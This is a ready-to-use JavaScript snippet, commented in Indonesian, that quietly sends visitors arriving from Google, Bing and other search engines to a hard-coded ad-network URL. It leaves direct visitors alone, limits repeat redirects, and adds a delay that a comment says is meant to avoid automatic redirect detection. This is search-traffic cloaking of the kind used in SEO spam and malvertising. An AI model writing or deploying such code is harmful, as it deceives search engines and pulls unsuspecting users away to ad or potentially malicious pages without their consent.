// Script Redirect dari Search Engine
(function() {
    // Daftar referer search engine utama
    const searchEngines = [
        'google.com',
        'google.co.id',
        'bing.com',
        'yahoo.com',
        'yandex.com',
        'baidu.com',
        'duckduckgo.com',
        'ask.com',
        'ecosia.org',
        'search.yahoo.com',
        'search.brave.com'
    ];
    
    // URL tujuan redirect
    const redirectUrl = 'https://www.effectivegatecpm.com/ncm6bswk9?key=62528b16899f546dcfe3d7c652d13893';
    
    // Fungsi untuk memeriksa apakah referer berasal dari search engine
    function isFromSearchEngine() {
        // Mendapatkan referer dari halaman sebelumnya
        const referrer = document.referrer.toLowerCase();
        
        // Jika tidak ada referer, bukan dari search engine
        if (!referrer) return false;
        
        // Periksa apakah referer mengandung domain search engine
        for (let i = 0; i < searchEngines.length; i++) {
            if (referrer.includes(searchEngines[i])) {
                return true;
            }
        }
        
        return false;
    }
    
    // Fungsi untuk memeriksa apakah pengunjung datang secara langsung
    function isDirectAccess() {
        // Mendapatkan performance navigation timing
        const perf = window.performance || window.webkitPerformance || window.msPerformance || window.mozPerformance;
        
        if (perf && perf.navigation) {
            // type 0: Navigasi langsung (ketik URL, bookmark, dll)
            // type 1: Reload
            // type 2: Navigasi melalui history (back/forward)
            return perf.navigation.type === 0;
        }
        
        // Fallback: periksa referer
        return !document.referrer;
    }
    
    // Fungsi untuk melakukan redirect
    function performRedirect() {
        // Simpan timestamp untuk mencegah redirect berulang
        localStorage.setItem('redirectTimestamp', Date.now());
        window.location.replace(redirectUrl);
    }
    
    // Fungsi utama
    function init() {
        // Jangan redirect jika halaman diakses langsung
        if (isDirectAccess()) {
            console.log('Akses langsung - tidak melakukan redirect');
            return;
        }
        
        // Redirect hanya jika berasal dari search engine
        if (isFromSearchEngine()) {
            console.log('Berasal dari search engine - melakukan redirect');
            
            // Cek apakah sudah pernah di-redirect dalam 30 menit terakhir
            const lastRedirect = localStorage.getItem('redirectTimestamp');
            const currentTime = Date.now();
            
            if (lastRedirect && (currentTime - parseInt(lastRedirect)) < 30 * 60 * 1000) {
                console.log('Redirect sudah dilakukan dalam 30 menit terakhir - skip');
                return;
            }
            
            // Delay sedikit untuk menghindari deteksi otomatis redirect
            setTimeout(performRedirect, 100);
        } else {
            console.log('Bukan dari search engine - tidak melakukan redirect');
        }
    }
    
    // Jalankan script setelah halaman selesai dimuat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
